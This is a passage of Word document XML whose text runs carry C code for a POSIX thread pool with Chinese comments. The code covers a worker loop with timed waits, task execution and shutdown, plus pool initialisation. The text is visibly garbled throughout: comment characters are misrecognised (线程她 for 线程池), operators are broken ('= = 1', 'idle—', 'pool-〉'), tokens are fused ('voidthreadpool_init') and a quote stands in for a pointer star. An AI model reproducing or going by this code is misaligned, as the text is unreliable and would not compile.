        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃该函数会解质，允许其他线程访问，当被唤醒时，加成</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">status </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_timedwait(&amp;pool-&gt;ready, &amp;abstime);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if(status == ETIMEDOUT)</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2260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>printf("thread %d wait timed out\n", (int)pthread_self());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>timeout = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="1020" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>break;</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-&gt;idle—;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if(pool-&gt;first != NULL)</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1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃取出等待队列最前的任务，移除任务，并执行任务</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">task_t *t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-&gt;first;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-&gt;first = t-&gt;next;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃由于任务执行審要消耗时间，先解救让其他线程访问线程她</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_unlock(&amp;pool-&gt; ready);</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃执行任务</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>t-&gt;run(t-&gt;arg);</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃执行完任务释放内存</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>free(t);</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃重新加漩</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_lock(&amp;pool-&gt; ready);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="15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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃退出线程她</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if(pool-&gt;quit </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>&amp;&amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">pool-〉first </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">== </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>NULL)</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900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">pool-〉counter--; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃当前工作的线程数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃若线程她中没有线程，通知等待线程(主线程)全部任务已经完成</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1900" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if(pool-&gt; counter </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>== 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">condition_signal(&amp;pool-&gt;ready); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">condition_unlock(&amp;pool-&gt; ready); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="15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1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃超时，跳出销毁线程</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if(timeout </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>= = 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="15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315" w:lineRule="exact"/>
        <w:ind w:left="1920" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-〉counter--;//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当前工作的线程数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-1 condition_unlock(&amp;pool-&gt; ready); break;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="15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315" w:lineRule="exact"/>
        <w:ind w:left="1540" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_unlock(&amp;pool-&gt; ready);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="315" w:lineRule="exact"/>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340" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>printf("thread %d is exiting\n", (int)pthread_self()); return NULL;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃线程她初始化</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>voidthreadpool_init(threadpool_t "pool, intthreads) (</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_init(&amp;pool-&gt; ready);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-&gt;first = NULL;</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pool-&gt;last =NULL;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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pool-&gt;counter =0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-&gt;idle =0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-&gt;max_threads = threads;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="1340" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-&gt;quit =0;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃增加一个任务到线程她</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">void threadpool_add_task(threadpool_t "pool, void </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
